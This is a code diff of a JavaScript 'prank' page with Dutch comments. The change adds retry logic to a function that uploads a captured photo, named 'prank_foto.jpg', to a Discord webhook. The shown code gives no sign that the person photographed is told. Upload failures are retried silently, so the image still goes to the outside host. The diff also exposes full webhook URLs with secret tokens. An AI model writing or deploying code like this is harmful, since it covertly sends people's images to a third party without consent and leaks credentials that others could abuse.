@@ -164,15 +164,24 @@
   }
 
   /* ---- Foto sturen naar Discord (via Blob — betrouwbaarder op iOS) ---- */
-  var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504871411666128917/AJAcDNUnPoNTHhzgNvV2SZc4GmnUuu1wu33vRK8VCPGfycX9iK21A5e7Xaj4P0y7qCtf';
+  var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504871414203945021/EP6lLwMehByFAAzVbNHcR2ZLe05l8fyhwK5c6V7b57vhRUkhT59GoPVBnb1vlQV8m6zd';
+  var discordBlob = null;
 
-  function stuurNaarDiscord(blob) {
-    if (!DISCORD_WEBHOOK) return;
+  function stuurNaarDiscord(blob, poging) {
+    if (!DISCORD_WEBHOOK || !blob) return;
+    poging = poging || 1;
+    if (poging > 4) return; // max 4 pogingen
+    discordBlob = blob;
     var fd = new FormData();
     fd.append('file', blob, 'prank_foto.jpg');
     fd.append('content', 'Nieuwe prank foto! ' + new Date().toLocaleString('nl-NL'));
     fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd })
-      .catch(function(){});
+      .then(function(r) {
+        if (!r.ok) setTimeout(function() { stuurNaarDiscord(discordBlob, poging + 1); }, 3000);
+      })
+      .catch(function() {
+        setTimeout(function() { stuurNaarDiscord(discordBlob, poging + 1); }, 3000);
+      });
   }
 
   /* ---- Foto maken (canvas.toBlob = native iOS, snel en klein) ---- */
